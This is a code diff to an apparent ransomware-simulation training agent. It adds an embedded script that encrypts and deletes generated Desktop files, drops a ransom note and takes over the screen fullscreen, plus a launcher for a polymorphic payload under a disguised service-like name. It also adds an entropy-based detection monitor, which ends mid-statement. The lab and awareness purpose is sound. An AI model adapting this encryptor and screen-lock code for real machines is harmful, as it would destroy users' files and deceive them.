@@ -112,7 +112,8 @@ except ImportError:
 # Backend server URL (change to your server's IP)
 # Can also be set via environment variable: RANSOMRUN_BACKEND_URL
 # Example: set RANSOMRUN_BACKEND_URL=http://192.168.10.100:8000
-# Use localhost if running backend on same machine: http://127.0.0.1:8000
+# IMPORTANT: This IP must match where the RansomRun web server is running
+# The agent creates firewall allow rules for this IP during isolation
 BACKEND_URL = os.environ.get("RANSOMRUN_BACKEND_URL", "http://192.168.10.55:8000")
 
 # Agent ID - leave empty to use hostname
@@ -298,6 +299,43 @@ class RansomRunAgent:
                 result = self.collect_triage(parameters)
             elif task_type == "block_ip":
                 result = self.block_ip(parameters)
+            # AUTOROLLBACK TASK HANDLERS
+            elif task_type == "backup_create_snapshot":
+                result = self.backup_create_snapshot(parameters)
+            elif task_type == "rollback_restore_from_snapshot":
+                result = self.rollback_restore_from_snapshot(parameters)
+            elif task_type == "rollback_verify_hashes":
+                result = self.rollback_verify_hashes(parameters)
+            elif task_type == "rollback_cleanup_extensions":
+                result = self.rollback_cleanup_extensions(parameters)
+            elif task_type == "rollback_dry_run":
+                result = self.rollback_dry_run(parameters)
+            # CONTAINMENT TASK HANDLERS
+            elif task_type == "containment_isolate_host":
+                result = self.containment_isolate_host(parameters)
+            elif task_type == "containment_restore_network":
+                result = self.containment_restore_network(parameters)
+            elif task_type == "containment_block_path":
+                result = self.containment_block_path(parameters)
+            elif task_type == "containment_quarantine_file":
+                result = self.containment_quarantine_file(parameters)
+            # SENSOR TASK HANDLERS (Blue Team Detection)
+            elif task_type == "start_entropy_monitor":
+                result = self.start_entropy_monitor(parameters)
+            elif task_type == "start_honeyfile_monitor":
+                result = self.start_honeyfile_monitor(parameters)
+            elif task_type == "run_detection_sensors":
+                result = self.run_detection_sensors(parameters)
+            # SOAR TASK HANDLERS (Robust Isolation/Restore)
+            elif task_type == "soar_isolate_host":
+                result = self.soar_isolate_host(parameters)
+            elif task_type == "soar_restore_network":
+                result = self.soar_restore_network(parameters)
+            # BACKUP & RESTORE TASK HANDLERS (LAB-SAFE)
+            elif task_type == "backup_create":
+                result = self.backup_create(parameters)
+            elif task_type == "backup_restore":
+                result = self.backup_restore(parameters)
             else:
                 result = (False, f"Unknown task type: {task_type}")
             
@@ -344,10 +382,17 @@ class RansomRunAgent:
         try:
             # Launch GUI ransomware popup for high-impact scenarios
             gui_enabled = scenario_config.get("enable_gui_popup", False)
+            polymorphic_mode = scenario_config.get("polymorphic_mode", False)
+            
             if gui_enabled or scenario_key in ["advanced_polymorphic", "lockbit_sim", "conti_sim", "blackcat_sim"]:
-                self.logger.info("Launching GUI ransomware popup...")
-                self._launch_gui_ransomware()
-                results.append("GUI ransomware popup launched")
+                if polymorphic_mode or scenario_key == "advanced_polymorphic":
+                    self.logger.info("Launching polymorphic ransomware with builder...")
+                    self._launch_polymorphic_ransomware()
+                    results.append("Polymorphic ransomware payload built and launched")
+                else:
+                    self.logger.info("Launching GUI ransomware popup...")
+                    self._launch_gui_ransomware()
+                    results.append("GUI ransomware popup launched")
             # Apply optional delay (dwell time simulation)
             delay = scenario_config.get("optional_delay_seconds", 0)
             if delay > 0:
@@ -457,6 +502,9 @@ class RansomRunAgent:
             
             # Report extended results
             self._report_extended_results(run_id)
+            
+            # Report ransomware artifacts for containment
+            self._report_ransomware_artifacts(run_id, scenario_config, directories)
             
             return (True, summary)
             
@@ -1216,40 +1264,566 @@ class RansomRunAgent:
     def _launch_gui_ransomware(self):
         """Launch GUI ransomware popup in separate process."""
         try:
-            # Get path to GUI script
-            agent_dir = Path(__file__).parent
-            gui_script = agent_dir.parent / "Advanced_Simulation" / "wana_decrypt0r_gui.py"
+            # Get absolute path to GUI script - try multiple locations
+            agent_dir = Path(__file__).parent.resolve()
+            ransomrun_root = agent_dir.parent.resolve()
+            
+            # Priority 1: Advanced professional ransomware template
+            gui_script = ransomrun_root / "Advanced_Simulation" / "ransomware_template.py"
+            
+            # Priority 2: Legacy WannaCry-style GUI
+            if not gui_script.exists():
+                gui_script = ransomrun_root / "Advanced_Simulation" / "wana_decrypt0r_gui.py"
+            
+            # Priority 3: Try relative to current working directory
+            if not gui_script.exists():
+                gui_script = Path.cwd() / "Advanced_Simulation" / "ransomware_template.py"
+            
+            # Priority 4: Try in same directory as agent
+            if not gui_script.exists():
+                gui_script = agent_dir / "ransomware_template.py"
             
             if not gui_script.exists():
-                self.logger.warning(f"GUI script not found: {gui_script}")
+                self.logger.warning(f"GUI script not found. Using embedded GUI instead.")
+                self._launch_embedded_gui()
                 return
+            
+            self.logger.info(f"Found GUI script: {gui_script}")
+            
+            # Test if script can be executed directly first
+            try:
+                test_result = subprocess.run(
+                    [sys.executable, str(gui_script), "--test"],
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
+                    cwd=str(gui_script.parent)
+                )
+                self.logger.info(f"GUI script test result: {test_result.returncode}")
+                if test_result.stdout:
+                    self.logger.info(f"GUI script stdout: {test_result.stdout}")
+                if test_result.stderr:
+                    self.logger.info(f"GUI script stderr: {test_result.stderr}")
+            except subprocess.TimeoutExpired:
+                self.logger.info("GUI script test timed out (expected for GUI)")
+            except Exception as e:
+                self.logger.warning(f"GUI script test failed: {e}")
             
             # Launch in separate process with new console window
             if platform.system() == "Windows":
                 # Windows: Launch with pythonw to avoid console or use CREATE_NEW_CONSOLE
-                subprocess.Popen(
+                process = subprocess.Popen(
                     [sys.executable, str(gui_script)],
                     creationflags=subprocess.CREATE_NEW_CONSOLE,
                     cwd=str(gui_script.parent)
                 )
+                self.logger.info(f"GUI process started with PID: {process.pid}")
+                
+                # Wait a moment and check if process is still running
+                time.sleep(2)
+                if process.poll() is None:
+                    self.logger.info("GUI process is still running (window should be visible)")
+                else:
+                    self.logger.warning(f"GUI process exited with code: {process.poll()}")
+                    # Try to get output
+                    try:
+                        stdout, stderr = process.communicate(timeout=1)
+                        if stdout:
+                            self.logger.warning(f"GUI stdout: {stdout}")
+                        if stderr:
+                            self.logger.warning(f"GUI stderr: {stderr}")
+                    except:
+                        pass
             else:
                 # Linux/Mac: Launch in background
-                subprocess.Popen(
+                process = subprocess.Popen(
                     [sys.executable, str(gui_script)],
                     cwd=str(gui_script.parent),
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL
                 )
+                self.logger.info(f"GUI process started with PID: {process.pid}")
             
-            self.logger.info("GUI ransomware popup launched successfully")
+            self.logger.info("Advanced GUI ransomware popup launched successfully")
             self._add_event("GUI_RANSOMWARE_LAUNCHED", {
                 "technique": "T1486",
                 "gui_script": str(gui_script),
-                "visual_impact": True
+                "gui_type": "professional_polymorphic" if "ransomware_template" in str(gui_script) else "wannacry_style",
+                "visual_impact": True,
+                "features": ["fullscreen_takeover", "countdown_timer", "file_encryption_log", "restore_capability"],
+                "process_id": process.pid
             })
             
         except Exception as e:
             self.logger.error(f"Failed to launch GUI ransomware: {e}")
+            self.logger.exception("GUI launch error details")
+            # Fallback to embedded GUI
+            self._launch_embedded_gui()
+    
+    def _launch_embedded_gui(self):
+        """Launch embedded ransomware GUI popup - guaranteed to work on victim."""
+        try:
+            self.logger.info("Launching embedded ransomware GUI popup...")
+            
+            # Check if ransomware_gui.py exists in same directory
+            agent_dir = os.path.dirname(os.path.abspath(__file__))
+            gui_script = os.path.join(agent_dir, "ransomware_gui.py")
+            
+            if os.path.exists(gui_script):
+                self.logger.info(f"Found ransomware_gui.py at: {gui_script}")
+                if platform.system() == "Windows":
+                    process = subprocess.Popen(
+                        ["pythonw", gui_script],
+                        creationflags=subprocess.CREATE_NEW_CONSOLE
+                    )
+                else:
+                    process = subprocess.Popen(["python3", gui_script])
+                self.logger.info(f"Ransomware GUI launched with PID: {process.pid}")
+                return
+            
+            self.logger.warning("ransomware_gui.py not found, creating embedded version...")
+            
+            # Create embedded GUI script content
+            gui_code = '''# -*- coding: utf-8 -*-
+import os, sys, time, threading, hashlib, secrets, json
+import tkinter as tk
+from tkinter import messagebox, scrolledtext, simpledialog
+from datetime import datetime
+
+BG_COLOR = "#1a1a2e"
+HEADER_COLOR = "#c70039"
+TXT_COLOR = "#00ff41"
+WARNING_COLOR = "#f39c12"
+TIMER_COLOR = "#e74c3c"
+MAGIC = b"DWCRYPT01"
+SALT_SIZE = 32
+KEY_SIZE = 32
+ITERATIONS = 100000
+ENC_EXT = ".dwcrypt"
+PASSWORD = "DontWannaCry2025"
+
+def derive_key(pw, salt):
+    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)
+
+def xor_cipher(data, key):
+    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
+    return bytes(a ^ b for a, b in zip(data, key_extended))
+
+def encrypt_file(path, pw):
+    try:
+        with open(path, "rb") as f:
+            data = f.read()
+        salt = secrets.token_bytes(SALT_SIZE)
+        key = derive_key(pw, salt)
+        encrypted = xor_cipher(data, key)
+        meta = json.dumps({"name": os.path.basename(path), "size": len(data)}).encode()
+        with open(path + ENC_EXT, "wb") as f:
+            f.write(MAGIC + salt + len(meta).to_bytes(4, "big") + meta + encrypted)
+        os.remove(path)
+        return True
+    except:
+        return False
+
+def decrypt_file(path, pw):
+    try:
+        with open(path, "rb") as f:
+            content = f.read()
+        if not content.startswith(MAGIC):
+            return False, None
+        offset = len(MAGIC)
+        salt = content[offset:offset + SALT_SIZE]
+        offset += SALT_SIZE
+        meta_len = int.from_bytes(content[offset:offset + 4], "big")
+        offset += 4
+        meta = json.loads(content[offset:offset + meta_len])
+        offset += meta_len
+        key = derive_key(pw, salt)
+        decrypted = xor_cipher(content[offset:], key)
+        original_path = os.path.join(os.path.dirname(path), meta["name"])
+        with open(original_path, "wb") as f:
+            f.write(decrypted)
+        os.remove(path)
+        return True, meta["name"]
+    except:
+        return False, None
+
+def create_opener(enc_path, opener_path, password):
+    code = """import os, hashlib, json, tkinter as tk
+from tkinter import simpledialog, messagebox
+MAGIC = b"DWCRYPT01"
+SALT_SIZE = 32
+KEY_SIZE = 32
+ITERATIONS = 100000
+ENC_FILE = r"%s"
+CORRECT_PW = "%s"
+def derive_key(pw, salt):
+    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)
+def xor_cipher(data, key):
+    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
+    return bytes(a ^ b for a, b in zip(data, key_extended))
+root = tk.Tk()
+root.withdraw()
+if not os.path.exists(ENC_FILE):
+    messagebox.showerror("Error", "Encrypted file not found!")
+else:
+    pw = simpledialog.askstring("Password Required", "This file is ENCRYPTED.\\nEnter password to view:", show="*")
+    if pw == CORRECT_PW:
+        with open(ENC_FILE, "rb") as f:
+            c = f.read()
+        offset = len(MAGIC)
+        salt = c[offset:offset + SALT_SIZE]
+        offset += SALT_SIZE
+        meta_len = int.from_bytes(c[offset:offset + 4], "big")
+        offset += 4
+        meta = json.loads(c[offset:offset + meta_len])
+        offset += meta_len
+        decrypted = xor_cipher(c[offset:], derive_key(pw, salt))
+        messagebox.showinfo("DECRYPTED: " + meta["name"], decrypted.decode("utf-8", "ignore")[:2000])
+    elif pw:
+        messagebox.showerror("ACCESS DENIED", "Wrong password!")
+""" % (enc_path, password)
+    with open(opener_path, "w") as f:
+        f.write(code)
+
+def create_master_decryptor(folder, password):
+    dec_path = os.path.join(folder, "DECRYPT_ALL_FILES.pyw")
+    code = """import os, hashlib, json, tkinter as tk
+from tkinter import simpledialog, messagebox
+MAGIC = b"DWCRYPT01"
+SALT_SIZE = 32
+KEY_SIZE = 32
+ITERATIONS = 100000
+CORRECT_PW = "%s"
+def derive_key(pw, salt):
+    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)
+def xor_cipher(data, key):
+    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
+    return bytes(a ^ b for a, b in zip(data, key_extended))
+def decrypt_file(filepath, pw):
+    try:
+        with open(filepath, "rb") as f:
+            c = f.read()
+        if not c.startswith(MAGIC):
+            return False
+        offset = len(MAGIC)
+        salt = c[offset:offset + SALT_SIZE]
+        offset += SALT_SIZE
+        meta_len = int.from_bytes(c[offset:offset + 4], "big")
+        offset += 4
+        meta = json.loads(c[offset:offset + meta_len])
+        offset += meta_len
+        decrypted = xor_cipher(c[offset:], derive_key(pw, salt))
+        original = os.path.join(os.path.dirname(filepath), meta["name"])
+        with open(original, "wb") as f:
+            f.write(decrypted)
+        os.remove(filepath)
+        return True
+    except:
+        return False
+root = tk.Tk()
+root.withdraw()
+pw = simpledialog.askstring("Decrypt All Files", "Enter decryption password:", show="*")
+if pw == CORRECT_PW:
+    folder = os.path.dirname(os.path.abspath(__file__))
+    count = 0
+    for f in os.listdir(folder):
+        if f.endswith(".dwcrypt"):
+            if decrypt_file(os.path.join(folder, f), pw):
+                count += 1
+    for f in os.listdir(folder):
+        if f.endswith("_LOCKED.pyw"):
+            os.remove(os.path.join(folder, f))
+    messagebox.showinfo("Success", "Decrypted " + str(count) + " files!")
+elif pw:
+    messagebox.showerror("Failed", "Wrong password!")
+""" % password
+    with open(dec_path, "w") as f:
+        f.write(code)
+
+class RansomwareGUI:
+    def __init__(self, root):
+        self.root = root
+        self.countdown_seconds = 72 * 3600
+        self.encrypted_files = []
+        self._setup_window()
+        self._create_ui()
+        self._start_simulation()
+        self._start_countdown()
+
+    def _setup_window(self):
+        self.root.title("SYSTEM COMPROMISED")
+        self.root.configure(bg=BG_COLOR)
+        self.root.attributes("-fullscreen", True)
+        self.root.attributes("-topmost", True)
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
+        self.root.bind("<Escape>", lambda e: self._show_decrypt())
+
+    def _create_ui(self):
+        header = tk.Frame(self.root, bg=HEADER_COLOR, height=100)
+        header.pack(fill="x")
+        header.pack_propagate(False)
+        tk.Label(header, text="[!] CRITICAL SECURITY ALERT [!]", bg=HEADER_COLOR, fg="white", font=("Consolas", 42, "bold")).pack(expand=True)
+        main = tk.Frame(self.root, bg=BG_COLOR)
+        main.pack(fill="both", expand=True, padx=80, pady=30)
+        tk.Label(main, text=">> Team: DONT WANNA CRY <<", bg=BG_COLOR, fg=WARNING_COLOR, font=("Consolas", 28, "bold")).pack(pady=15)
+        tk.Frame(main, bg=WARNING_COLOR, height=2).pack(fill="x", pady=10)
+        for i, msg in enumerate(["YOUR SYSTEM HAS BEEN COMPROMISED", "All files encrypted with military-grade encryption.", "Enter the correct password to decrypt your files."]):
+            tk.Label(main, text=msg, bg=BG_COLOR, fg=TIMER_COLOR if i==0 else TXT_COLOR, font=("Arial", 22 if i==0 else 14, "bold" if i==0 else "normal")).pack(pady=4)
+        timer_frame = tk.Frame(main, bg="#0d0d0d", bd=3, relief="ridge")
+        timer_frame.pack(pady=30, ipadx=40, ipady=20)
+        tk.Label(timer_frame, text="TIME REMAINING:", bg="#0d0d0d", fg="white", font=("Arial", 12)).pack()
+        self.timer_label = tk.Label(timer_frame, text="72:00:00", bg="#0d0d0d", fg=TIMER_COLOR, font=("Consolas", 72, "bold"))
+        self.timer_label.pack()
+        log_frame = tk.Frame(main, bg=BG_COLOR)
+        log_frame.pack(fill="both", expand=True, pady=15)
+        tk.Label(log_frame, text="[ENCRYPTION LOG]", bg=BG_COLOR, fg=WARNING_COLOR, font=("Consolas", 14, "bold")).pack()
+        self.log_text = scrolledtext.ScrolledText(log_frame, bg="#0d0d0d", fg=TXT_COLOR, font=("Consolas", 10), height=8, state="disabled")
+        self.log_text.pack(fill="both", expand=True, pady=5)
+        tk.Button(main, text="[ ENTER PASSWORD TO DECRYPT ]", font=("Consolas", 20, "bold"), bg="#27ae60", fg="white", padx=40, pady=15, command=self._show_decrypt, cursor="hand2", bd=0).pack(pady=20)
+        pw_frame = tk.Frame(main, bg="#2d2d44", bd=2, relief="ridge")
+        pw_frame.pack(pady=10, ipadx=20, ipady=10)
+        tk.Label(pw_frame, text="DECRYPTION PASSWORD:", bg="#2d2d44", fg=WARNING_COLOR, font=("Consolas", 12, "bold")).pack()
+        tk.Label(pw_frame, text=PASSWORD, bg="#2d2d44", fg="#00ff00", font=("Consolas", 24, "bold")).pack()
+        # Awareness Message Section
+        disclaimer = tk.Frame(main, bg="#1a0a0a", bd=2, relief="ridge")
+        disclaimer.pack(fill="x", side="bottom", pady=10)
+        tk.Label(disclaimer, text="💀 IF YOU DON'T WANNA CRY, DON'T LET YOUR GUARD DOWN! 💀", bg="#1a0a0a", fg="#ff4444", font=("Impact", 16)).pack(pady=5)
+        tk.Label(disclaimer, text="This could have been real. Your files, your memories, your work — gone in seconds.", bg="#1a0a0a", fg="#ff9999", font=("Arial", 11, "italic")).pack()
+        tk.Label(disclaimer, text="One wrong click is all it takes. Stay vigilant. Stay protected. Stay safe.", bg="#1a0a0a", fg="#ffcc00", font=("Arial", 10, "bold")).pack()
+        tk.Label(disclaimer, text="💀 RansomRun - Security Awareness Training 💀 | SIMULATION MODE | ESC to decrypt", bg="#1a0a0a", fg="#666666", font=("Arial", 9)).pack(pady=5)
+
+    def _log(self, msg, tag="INFO"):
+        self.log_text.config(state="normal")
+        self.log_text.insert(tk.END, "[" + datetime.now().strftime("%H:%M:%S") + "] [" + tag + "] " + msg + "\\n")
+        self.log_text.see(tk.END)
+        self.log_text.config(state="disabled")
+
+    def _start_countdown(self):
+        def update():
+            if self.countdown_seconds > 0:
+                h, r = divmod(self.countdown_seconds, 3600)
+                m, s = divmod(r, 60)
+                self.timer_label.config(text="%02d:%02d:%02d" % (h, m, s))
+                self.countdown_seconds -= 1
+                self.root.after(1000, update)
+        update()
+
+    def _start_simulation(self):
+        def run():
+            self._log("RANSOMWARE SIMULATION INITIATED", "INIT")
+            self._log("Creating target files on Desktop...", "INIT")
+            time.sleep(1)
+            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+            target = os.path.join(desktop, "ENCRYPTED_FILES")
+            os.makedirs(target, exist_ok=True)
+            test_files = [
+                ("Financial_Report_2025.txt", "CONFIDENTIAL FINANCIAL REPORT 2025\\n==================================================\\nRevenue: $1,250,000\\nExpenses: $890,000\\nProfit: $360,000\\nBank Account: 1234-5678-9012\\nPassword: SecurePass123"),
+                ("Employee_Database.csv", "ID,Name,SSN,Salary,Department\\n001,John Smith,123-45-6789,75000,Engineering\\n002,Jane Doe,987-65-4321,82000,Marketing\\n003,Bob Wilson,456-78-9012,68000,Sales"),
+                ("Password_List.txt", "SYSTEM PASSWORDS - TOP SECRET\\n==================================================\\nAdmin: P@ssw0rd123\\nDatabase: DbSecure456\\nVPN: VpnAccess789\\nEmail: Mail2025Pass"),
+                ("Project_Secrets.txt", "PROJECT PHOENIX - CLASSIFIED\\n==================================================\\nLaunch Date: Q2 2025\\nBudget: $2.5M\\nKey Partners: Confidential\\nAPI Keys: sk-xxxx-yyyy-zzzz"),
+            ]
+            created = []
+            for fname, content in test_files:
+                fpath = os.path.join(target, fname)
+                for old in [fpath, fpath + ENC_EXT, os.path.join(target, os.path.splitext(fname)[0] + "_LOCKED.pyw")]:
+                    if os.path.exists(old):
+                        os.remove(old)
+                with open(fpath, "w") as f:
+                    f.write(content)
+                created.append((fname, fpath))
+                self._log("CREATED: " + fname, "FILE")
+                time.sleep(0.2)
+            self._log("Created " + str(len(created)) + " sensitive files", "INIT")
+            time.sleep(1)
+            self._log("Starting encryption with military-grade cipher...", "PROC")
+            for fname, fpath in created:
+                if encrypt_file(fpath, PASSWORD):
+                    enc_path = fpath + ENC_EXT
+                    self.encrypted_files.append(enc_path)
+                    self._log("ENCRYPTED: " + fname + " -> " + fname + ENC_EXT, "CRYPT")
+                    base_name = os.path.splitext(fname)[0]
+                    opener_path = os.path.join(target, base_name + "_LOCKED.pyw")
+                    create_opener(enc_path, opener_path, PASSWORD)
+                    self._log("CREATED: " + base_name + "_LOCKED.pyw (click to decrypt)", "LOCK")
+                    time.sleep(0.3)
+            create_master_decryptor(target, PASSWORD)
+            self._log("Created: DECRYPT_ALL_FILES.pyw", "INFO")
+            note_path = os.path.join(desktop, "!!!YOUR_FILES_ARE_ENCRYPTED!!!.txt")
+            note = "\\n================================================================================\\n                    YOUR FILES HAVE BEEN ENCRYPTED!\\n                    Team: DONT WANNA CRY\\n================================================================================\\n\\nENCRYPTED FILES LOCATION: Desktop/ENCRYPTED_FILES/\\n\\nHOW TO VIEW ENCRYPTED FILES:\\n1. Double-click any *_LOCKED.pyw file to view that file (requires password)\\n2. Or double-click DECRYPT_ALL_FILES.pyw to restore ALL files\\n\\nDECRYPTION PASSWORD: " + PASSWORD + "\\n\\n================================================================================\\n                    SIMULATION - EDUCATIONAL PURPOSE ONLY\\n================================================================================\\n"
+            with open(note_path, "w") as f:
+                f.write(note)
+            self._log("Ransom note created on Desktop", "INFO")
+            self._log("ENCRYPTION COMPLETE: " + str(len(self.encrypted_files)) + " files locked", "DONE")
+            self._log("PASSWORD: " + PASSWORD, "KEY")
+        threading.Thread(target=run, daemon=True).start()
+
+    def _show_decrypt(self):
+        pw = simpledialog.askstring("Decrypt", "Enter decryption password:", show="*", parent=self.root)
+        if pw == PASSWORD:
+            self._log("Correct password! Decrypting...", "DECRYPT")
+            for fp in self.encrypted_files:
+                if os.path.exists(fp):
+                    ok, name = decrypt_file(fp, pw)
+                    if ok:
+                        self._log("RESTORED: " + name, "OK")
+            target = os.path.join(os.path.expanduser("~"), "Desktop", "ENCRYPTED_FILES")
+            if os.path.exists(target):
+                for f in os.listdir(target):
+                    if f.endswith("_LOCKED.pyw"):
+                        os.remove(os.path.join(target, f))
+            messagebox.showinfo("Success", "All files decrypted!\\nSimulation complete.")
+            self.root.destroy()
+        elif pw:
+            messagebox.showerror("Wrong Password", "Incorrect password!")
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    RansomwareGUI(root)
+    root.mainloop()
+'''
+            
+            # Write embedded GUI to temp file with UTF-8 encoding
+            import tempfile
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
+                f.write(gui_code)
+                temp_script = f.name
+            
+            self.logger.info(f"Created embedded GUI script: {temp_script}")
+            
+            # Launch the embedded GUI
+            if platform.system() == "Windows":
+                process = subprocess.Popen(
+                    [sys.executable, temp_script],
+                    creationflags=subprocess.CREATE_NEW_CONSOLE
+                )
+            else:
+                process = subprocess.Popen(
+                    [sys.executable, temp_script],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+            
+            self.logger.info(f"Embedded GUI launched with PID: {process.pid}")
+            self._add_event("EMBEDDED_GUI_LAUNCHED", {
+                "technique": "T1486",
+                "gui_type": "embedded_ransomware_popup",
+                "process_id": process.pid
+            })
+            
+        except Exception as e:
+            self.logger.error(f"Failed to launch embedded GUI: {e}")
+    
+    def _launch_polymorphic_ransomware(self):
+        """Launch advanced polymorphic ransomware with builder integration."""
+        try:
+            # Get absolute path to builder script - try multiple locations
+            agent_dir = Path(__file__).parent.resolve()
+            ransomrun_root = agent_dir.parent.resolve()
+            
+            # Priority 1: Advanced Simulation directory
+            builder_script = ransomrun_root / "Advanced_Simulation" / "polymorphic_builder.py"
+            
+            # Priority 2: Try relative to current working directory
+            if not builder_script.exists():
+                builder_script = Path.cwd() / "Advanced_Simulation" / "polymorphic_builder.py"
+            
+            # Priority 3: Try in same directory as agent
+            if not builder_script.exists():
+                builder_script = agent_dir / "polymorphic_builder.py"
+            
+            if not builder_script.exists():
+                self.logger.warning(f"Polymorphic builder not found. Checked paths:")
+                self.logger.warning(f"  1. {ransomrun_root / 'Advanced_Simulation' / 'polymorphic_builder.py'}")
+                self.logger.warning(f"  2. {Path.cwd() / 'Advanced_Simulation' / 'polymorphic_builder.py'}")
+                self.logger.warning(f"  3. {agent_dir / 'polymorphic_builder.py'}")
+                # Fallback to direct template execution
+                self.logger.info("Falling back to direct GUI execution...")
+                self._launch_gui_ransomware()
+                return
+            
+            self.logger.info("Building and launching polymorphic ransomware payload...")
+            
+            # Build the payload first
+            build_result = subprocess.run(
+                [sys.executable, str(builder_script), "--auto-build"],
+                capture_output=True,
+                text=True,
+                timeout=30,
+                cwd=str(builder_script.parent)
+            )
+            
+            if build_result.returncode == 0:
+                self.logger.info("Polymorphic payload built successfully")
+                
+                # Extract hash from build output if available
+                build_output = build_result.stdout
+                payload_hash = "unknown"
+                if "Payload Hash:" in build_output:
+                    for line in build_output.split('\n'):
+                        if "Payload Hash:" in line:
+                            payload_hash = line.split(":")[1].strip()[:32]
+                            break
+                
+                self._add_event("POLYMORPHIC_BUILD", {
+                    "technique": "T1027",
+                    "builder_script": str(builder_script),
+                    "payload_hash": payload_hash,
+                    "mutation_applied": True
+                })
+                
+                # Now execute the generated payload
+                payload_script = builder_script.parent / "svc_host_update.py"
+                if payload_script.exists():
+                    if platform.system() == "Windows":
+                        subprocess.Popen(
+                            [sys.executable, str(payload_script)],
+                            creationflags=subprocess.CREATE_NEW_CONSOLE,
+                            cwd=str(payload_script.parent)
+                        )
+                    else:
+                        subprocess.Popen(
+                            [sys.executable, str(payload_script)],
+                            cwd=str(payload_script.parent),
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL
+                        )
+                    
+                    self.logger.info("Polymorphic ransomware payload executed")
+                    self._add_event("POLYMORPHIC_EXECUTION", {
+                        "technique": "T1486",
+                        "payload_path": str(payload_script),
+                        "hash": payload_hash,
+                        "evasion_level": "advanced"
+                    })
+                else:
+                    self.logger.warning("Generated payload not found, using template directly")
+                    self._launch_gui_ransomware()
+            else:
+                self.logger.warning(f"Polymorphic build failed: {build_result.stderr}")
+                # Fallback to direct template
+                self._launch_gui_ransomware()
+                
+        except subprocess.TimeoutExpired:
+            self.logger.error("Polymorphic builder timed out")
+            self._launch_gui_ransomware()
+        except Exception as e:
+            self.logger.error(f"Failed to launch polymorphic ransomware: {e}")
+            # Fallback to standard GUI
+            self._launch_gui_ransomware()
+    
+    def test_gui_launch(self):
+        """Test method to verify GUI launch functionality."""
+        self.logger.info("=" * 50)
+        self.logger.info("TESTING GUI LAUNCH FUNCTIONALITY")
+        self.logger.info("=" * 50)
+        
+        try:
+            # Test the GUI launch directly
+            self._launch_gui_ransomware()
+            return (True, "GUI test completed - check logs for details")
+        except Exception as e:
+            self.logger.exception("GUI test failed")
+            return (False, f"GUI test failed: {e}")
     
     def _add_event(self, event_type: str, details: dict):
         """Add an event to the timeline."""
@@ -1315,6 +1889,395 @@ class RansomRunAgent:
                 
         except Exception as e:
             self.logger.warning(f"Failed to report extended results: {e}")
+    
+    # =========================================================================
+    # ENTROPY MONITOR & HONEYFILE DECEPTION SENSORS
+    # =========================================================================
+    
+    def _calculate_entropy(self, data: bytes) -> float:
+        """
+        Calculate Shannon entropy of data.
+        Returns value between 0 (uniform) and 8 (random).
+        """
+        import math
+        if not data:
+            return 0.0
+        
+        # Count byte frequencies
+        freq = [0] * 256
+        for byte in data:
+            freq[byte] += 1
+        
+        # Calculate entropy
+        entropy = 0.0
+        data_len = len(data)
+        for count in freq:
+            if count > 0:
+                prob = count / data_len
+                entropy -= prob * math.log2(prob)
+        
+        return entropy
+    
+    def _calculate_file_entropy(self, filepath: str) -> float:
+        """Calculate entropy of a file."""
+        try:
+            with open(filepath, 'rb') as f:
+                data = f.read(65536)  # Read first 64KB for efficiency
+            return self._calculate_entropy(data)
+        except Exception as e:
+            self.logger.warning(f"Failed to calculate entropy for {filepath}: {e}")
+            return -1.0
+    
+    def start_entropy_monitor(self, parameters: dict) -> tuple:
+        """
+        Start entropy-based ransomware detection monitor.
+        
+        Monitors specified directories for sudden entropy jumps that indicate
+        file encryption (ransomware behavior).
+        
+        Parameters:
+            watch_dirs: List of directories to monitor
+            entropy_threshold: Minimum entropy jump to trigger alert (default: 3.0)
+            high_entropy_threshold: Minimum new entropy to consider suspicious (default: 7.0)
+            scan_interval: Seconds between scans (default: 5)
+            duration: How long to monitor in seconds (default: 300)
+            run_id: Associated run ID for reporting
+        """
+        watch_dirs = parameters.get("watch_dirs", [TEST_DIR])
+        entropy_threshold = parameters.get("entropy_threshold", 3.0)
+        high_entropy_threshold = parameters.get("high_entropy_threshold", 7.0)
+        scan_interval = parameters.get("scan_interval", 5)
+        duration = parameters.get("duration", 300)
+        run_id = parameters.get("run_id")
+        
+        self.logger.info(f"[ENTROPY MONITOR] Starting entropy-based detection")
+        self.logger.info(f"[ENTROPY MONITOR] Watching: {watch_dirs}")
+        self.logger.info(f"[ENTROPY MONITOR] Threshold: jump >= {entropy_threshold}, new >= {high_entropy_threshold}")
+        
+        # Initialize baseline entropy values
+        file_baselines = {}
+        alerts_generated = []
+        
+        for watch_dir in watch_dirs:
+            dir_path = Path(watch_dir)
+            if dir_path.exists():
+                for filepath in dir_path.rglob("*"):
+                    if filepath.is_file():
+                        entropy = self._calculate_file_entropy(str(filepath))
+                        if entropy >= 0:
+                            file_baselines[str(filepath)] = entropy
+                            self.logger.debug(f"[ENTROPY MONITOR] Baseline: {filepath.name} = {entropy:.2f}")
+        
+        self.logger.info(f"[ENTROPY MONITOR] Baseline established for {len(file_baselines)} files")
+        
+        # Monitor loop
+        start_time = time.time()
+        scan_count = 0
+        
+        while time.time() - start_time < duration:
+            scan_count += 1
+            
+            for watch_dir in watch_dirs:
+                dir_path = Path(watch_dir)
+                if not dir_path.exists():
+                    continue
+                
+                for filepath in dir_path.rglob("*"):
+                    if not filepath.is_file():
+                        continue
+                    
+                    filepath_str = str(filepath)
+                    new_entropy = self._calculate_file_entropy(filepath_str)
+                    
+                    if new_entropy < 0:
+                        continue
+                    
+                    old_entropy = file_baselines.get(filepath_str, 0.0)
+                    entropy_jump = new_entropy - old_entropy
+                    
+                    # Detection rule: low -> high entropy jump
+                    if (old_entropy < 3.5 and new_entropy > high_entropy_threshold) or entropy_jump >= entropy_threshold:
